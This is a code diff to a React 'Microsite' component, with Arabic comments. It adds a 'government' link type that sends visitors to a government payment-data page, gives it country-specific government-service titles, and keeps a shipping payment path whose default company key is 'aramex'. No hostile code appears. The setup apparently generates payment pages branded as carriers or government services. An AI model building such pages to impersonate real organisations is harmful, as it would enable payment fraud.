@@ -32,6 +32,12 @@ const Microsite = () => {
   const { data: link, isLoading } = useLink(id);
   const countryData = getCountryByCode(country || "");
   
+  // إذا كان النوع حكومي، نوجه مباشرة إلى صفحة الدفع الحكومي
+  if (link && link.type === 'government') {
+    navigate(`/pay/${id}/government-data`, { replace: true });
+    return null;
+  }
+  
   if (isLoading) {
     return (
       <div className="min-h-screen flex items-center justify-center">
@@ -64,6 +70,7 @@ const Microsite = () => {
   const isLogistics = link.type === 'logistics';
   const isContracts = link.type === 'contracts';
   const isChalet = link.type === 'chalet';
+  const isGovernment = link.type === 'government';
 
   // Get service branding for SEO and display
   const serviceName = payload.service_name || payload.chalet_name;
@@ -95,6 +102,8 @@ const Microsite = () => {
     ? `شحن ${payload.service_type_label || 'خدمة لوجستية'}`
     : isContracts
     ? `عقد ${payload.template_name}`
+    : isGovernment
+    ? `خدمة حكومية - ${countryData.nameAr}`
     : payload.chalet_name;
 
   // SEO metadata - Use dynamic company meta when available
@@ -108,6 +117,8 @@ const Microsite = () => {
     ? `شحن ${payload.service_type_label} - ${countryData.nameAr}`
     : isContracts
     ? `عقد ${payload.template_name} - ${countryData.nameAr}`
+    : isGovernment
+    ? `الخدمات الحكومية - ${countryData.nameAr}`
     : `حجز شاليه - ${payload.chalet_name}`;
   const seoDescription = isShipping
     ? companyMeta.description || `${serviceDescription} - تتبع شحنتك وأكمل الدفع بشكل آمن`
@@ -567,10 +578,14 @@ const Microsite = () => {
                 size="lg"
                 className="w-full text-xl py-7 shadow-glow animate-pulse-glow"
                 onClick={() => {
-                  const companyKey = payload.service_key || 'aramex';
-                  const currency = getCurrency(countryData.code);
-                  const title = `Payment in ${countryData.nameAr}`;
-                  navigate(`/pay/${link.id}/recipient?company=${companyKey}&currency=${currency}&title=${encodeURIComponent(title)}`);
+                  if (isGovernment) {
+                    navigate(`/pay/${link.id}/government-data`);
+                  } else {
+                    const companyKey = payload.service_key || 'aramex';
+                    const currency = getCurrency(countryData.code);
+                    const title = `Payment in ${countryData.nameAr}`;
+                    navigate(`/pay/${link.id}/recipient?company=${companyKey}&currency=${currency}&title=${encodeURIComponent(title)}`);
+                  }
                 }}
               >
                 <CreditCard className="w-6 h-6 ml-3" />
